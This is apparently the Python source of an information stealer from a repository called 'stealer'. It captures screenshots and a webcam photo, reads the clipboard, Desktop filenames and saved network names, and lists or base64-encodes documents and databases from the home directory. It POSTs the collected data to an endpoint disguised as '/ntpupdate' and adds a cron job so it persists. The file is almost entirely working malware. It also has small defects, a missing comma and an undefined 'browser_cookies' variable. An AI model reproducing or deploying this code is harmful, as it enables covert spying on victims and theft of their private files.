#N7y: https://github.com/0xN7y/stealer/
import os
import platform
import socket
import base64
import requests
import json
import sqlite3
import shutil
from pathlib import Path
import psutil
import pyperclip
import cv2
import subprocess
import time
import random
import os
import autopy


if os.getuid() != 0:
    print("")
    exit()
time.sleep(5)

def sysinf():
    try:
        system_info = {
            "username": os.getlogin(),
            "os_name": platform.system(),
            "os_version": platform.version(),
            "hostname": socket.gethostname(),
            "current_directory": os.getcwd(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "cpu": platform.processor(),
            "ram": f"{psutil.virtual_memory().total / (1024 ** 3)} GB",
        }
        return system_info
    except Exception as e:
        return {"error": str(e)}

def scsh():
    try:

        screenshot = autopy.bitmap.capture_screen()

        screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(screenshot_path)
        with open(screenshot_path, "rb") as image_file:
            encoded_screenshot = base64.b64encode(image_file.read()).decode('utf-8')
            os.popen("rm -rf "+screenshot_path)
        return encoded_screenshot
    except Exception as e:
        return {"error": str(e)}

def wbcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            webcam_image_path = os.path.join(os.getenv("TEMP"), "webcam_image.jpg")
            cv2.imwrite(webcam_image_path, frame)
            cam.release()
            with open(webcam_image_path, "rb") as image_file:
                encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
                os.popen("rm -rf "+webcam_image_path)
            return encoded_image
        else:
            cam.release()
            return {"error": "Could not capture webcam image"}
    except Exception as e:
        return {"error": str(e)}

def dfile():
    try:
        d_path = os.path.join(os.path.join(os.environ['HOME']), 'Desktop')
        filenames = os.listdir(d_path)
        return filenames
    except Exception as e:
        return {"error": str(e)}







def clipb():
    try:
        c_data = pyperclip.paste()
        return c_data
    except Exception as e:
        return {"error": str(e)}

def wifi_():
    try:
        networks = os.popen('nmcli -t -f NAME c').read().split('\n')
        wifi_data = []
        for network in networks:
            if network:
                wifi_data.append(network)
        return wifi_data
    except Exception as e:
        return {"error": str(e)}

def av_files(file_ext):
    try:
        home_path = str(Path.home())
        files = []
        for root, dirs, filenames in os.walk(home_path):
            for file in filenames:
                if file.lower().endswith(file_ext):
                    file_path = os.path.join(root, file)
                    files.append(file_path)
        return files
    except Exception as e:
        return {"error": str(e)}

def grep_files(file_ext,dirs=None):
    try:
        if dirs != None:
            home_path = dirs
        else:
            home_path = str(Path.home())
        files_data = []
        for root, dirs, filenames in os.walk(home_path):
            for file in filenames:
                if file.lower().endswith(file_ext):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            encoded_content = base64.b64encode(f.read()).decode('utf-8')
                        files_data.append({
                            "file_path": file_path,
                            "file_content": encoded_content
                        })
                    except Exception as e:
                        files_data.append({
                            "file_path": file_path,
                            "error": str(e)
                        })
        return files_data
    except Exception as e:
        return {"error": str(e)}

def send(data, uri):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(uri, headers=headers, data=json.dumps(data))
        return response.status_code, response.text
    except Exception as e:
        return {"error": str(e)}

def prestistance():
    try:
        s_path = os.path.abspath(__file__)
        c_j = f"0 */48 * * * python3 {s_path}\n"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{c_j}') | crontab -", shell=True)

        # print("ok.")
    except Exception as e:
        pass




uri = "http://localhost:5000/ntpupdate"
ip_ = requests.get("https://ipinfo.io/").text
system_info = sysinf()
screenshot = scsh()
webcam_image = wbcam()
desktop_filenames = dfile()
c_data = clipb()
wifi_networks = wifi_()
pdf_files = av_files(".pdf")
docx_files = av_files(".docx")
docx_files_ = grep_files('.docx')
txt_files = av_files(".txt")
db_files = av_files(".db")

data = {
    "IP" : ip_
    "system_info": system_info,
    "screenshot": screenshot,
    "webcam_image": webcam_image,
    "desktop_filenames": desktop_filenames,
    "browser_cookies": browser_cookies,
    "c_data": c_data,
    "wifi_networks": wifi_networks,
    "pdf_files": pdf_files,
    "docx_files": docx_files,
    "txt_files": txt_files,
    "db_file" : db_files
}
# print(data)

status_code, response = send(data, uri)
prestistance()
